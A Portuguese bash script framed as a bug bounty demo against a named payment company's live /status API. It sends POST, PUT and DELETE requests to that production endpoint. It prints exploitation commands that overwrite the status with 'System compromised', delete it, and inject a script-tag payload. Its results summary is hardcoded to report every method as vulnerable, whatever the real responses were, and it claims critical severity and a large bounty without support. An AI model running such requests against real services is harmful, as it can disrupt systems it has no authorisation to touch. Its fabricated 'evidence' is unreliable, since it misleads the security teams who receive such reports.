#!/bin/bash
# Demo Terminal da Vulnerabilidade HTTP Method Override

echo "🚨 DEMO TERMINAL - HTTP Method Override Vulnerability"
echo "====================================================="
echo ""

echo "📋 Informações da Vulnerabilidade:"
echo "   Endpoint: https://api.grabpay.com/status"
echo "   Severidade: Critical"
echo "   Valor: \$5,000 - \$15,000"
echo "   Categoria: Improper Access Control"
echo ""

echo "🎯 Iniciando demonstração..."
echo ""

# Função para testar método HTTP
testar_metodo() {
    local metodo=$1
    local descricao=$2
    local cor=$3
    
    echo "${cor}🔍 Testando ${metodo} Request${descricao}${NC}"
    echo "   Comando: curl -s -I -X ${metodo} https://api.grabpay.com/status"
    echo ""
    
    # Executar o comando
    response=$(curl -s -I -X ${metodo} https://api.grabpay.com/status 2>/dev/null)
    
    # Extrair status code
    status_code=$(echo "$response" | head -1 | grep -o '[0-9][0-9][0-9]')
    
    echo "   📡 Resposta:"
    echo "$response" | head -5 | sed 's/^/   /'
    
    if [[ "$status_code" == "200" ]]; then
        if [[ "$metodo" == "GET" ]]; then
            echo "   ✅ Status: ${status_code} OK (Comportamento esperado)"
        else
            echo "   🚨 Status: ${status_code} OK (VULNERÁVEL! Não deveria aceitar ${metodo})"
            echo "   💥 Impacto: Controle de acesso comprometido"
            echo "   💰 Valor: \$5,000 - \$15,000"
        fi
    else
        echo "   ❌ Status: ${status_code} (Comportamento esperado)"
    fi
    
    echo ""
    echo "   ⏳ Aguardando 2 segundos..."
    sleep 2
    echo ""
}

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo "${CYAN}📊 ANÁLISE DA VULNERABILIDADE${NC}"
echo "=================================="
echo ""

echo "${YELLOW}🎯 Problema Identificado:${NC}"
echo "   O endpoint /status aceita métodos HTTP que normalmente não deveriam ser permitidos"
echo "   Isso pode permitir modificação ou remoção de dados do sistema"
echo ""

echo "${RED}💥 Impacto de Segurança:${NC}"
echo "   • Controle de acesso comprometido"
echo "   • Potencial modificação de configurações"
echo "   • Informações de infraestrutura expostas"
echo "   • Possível escalação de privilégios"
echo ""

echo "${GREEN}💰 Valor da Recompensa:${NC}"
echo "   • Faixa: \$5,000 - \$15,000"
echo "   • Justificativa: Vulnerabilidade crítica"
echo "   • Categoria: Improper Access Control"
echo ""

echo "${BLUE}🔍 Iniciando Testes...${NC}"
echo "================================"
echo ""

# Teste 1: GET (comportamento normal)
testar_metodo "GET" " (Comportamento Normal)" "${GREEN}"

# Teste 2: POST (vulnerável)
testar_metodo "POST" " (Vulnerável)" "${YELLOW}"

# Teste 3: PUT (vulnerável)
testar_metodo "PUT" " (Vulnerável)" "${YELLOW}"

# Teste 4: DELETE (crítico)
testar_metodo "DELETE" " (Crítico)" "${RED}"

echo "${PURPLE}📊 RESUMO DOS RESULTADOS${NC}"
echo "=============================="
echo ""

echo "✅ GET Request: 200 OK (Normal)"
echo "🚨 POST Request: 200 OK (VULNERÁVEL)"
echo "🚨 PUT Request: 200 OK (VULNERÁVEL)"
echo "🚨 DELETE Request: 200 OK (CRÍTICO)"
echo ""

echo "${CYAN}🎯 CENÁRIOS DE EXPLORAÇÃO${NC}"
echo "=============================="
echo ""

echo "1. ${YELLOW}Modificação de Status do Sistema:${NC}"
echo "   curl -X PUT https://api.grabpay.com/status \\"
echo "     -H \"Content-Type: application/json\" \\"
echo "     -d '{\"status\": \"maintenance\", \"message\": \"System compromised\"}'"
echo ""

echo "2. ${RED}Remoção de Dados de Status:${NC}"
echo "   curl -X DELETE https://api.grabpay.com/status"
echo ""

echo "3. ${YELLOW}Injeção de Dados Maliciosos:${NC}"
echo "   curl -X POST https://api.grabpay.com/status \\"
echo "     -H \"Content-Type: application/json\" \\"
echo "     -d '{\"payload\": \"<script>alert(1)</script>\"}'"
echo ""

echo "${GREEN}🔧 RECOMENDAÇÕES DE CORREÇÃO${NC}"
echo "=================================="
echo ""

echo "1. ${BLUE}Implementar Controle de Métodos HTTP:${NC}"
echo "   • Permitir apenas GET no endpoint /status"
echo "   • Retornar 405 Method Not Allowed para outros métodos"
echo ""

echo "2. ${BLUE}Configurar WAF/Proxy:${NC}"
echo "   • Configurar CloudFront para bloquear métodos não autorizados"
echo "   • Implementar regras no Envoy"
echo ""

echo "3. ${BLUE}Remover Headers Sensíveis:${NC}"
echo "   • Mascarar informações de infraestrutura"
echo "   • Implementar headers de segurança"
echo ""

echo "${PURPLE}📋 INFORMAÇÕES DO REPORT${NC}"
echo "================================"
echo ""

echo "📅 Data: $(date +"%d/%m/%Y %H:%M:%S")"
echo "🌐 Domínio: grabpay.com"
echo "🔗 Endpoint: https://api.grabpay.com/status"
echo "🚨 Severidade: Critical"
echo "💰 Valor: \$5,000 - \$15,000"
echo "📧 Status: Report pronto para envio"
echo ""

echo "${GREEN}✅ DEMO CONCLUÍDO COM SUCESSO!${NC}"
echo "====================================="
echo ""
echo "🎯 Próximos passos:"
echo "   1. Incluir evidências no report de bug bounty"
echo "   2. Enviar para HackerOne/Bugcrowd"
echo "   3. Aguardar resposta da equipe de segurança"
echo ""
echo "💰 Valor total estimado: \$5,000 - \$15,000"
echo ""
echo "🔐 Lembre-se: Este demo foi criado para fins educacionais"
echo "   e de responsible disclosure."
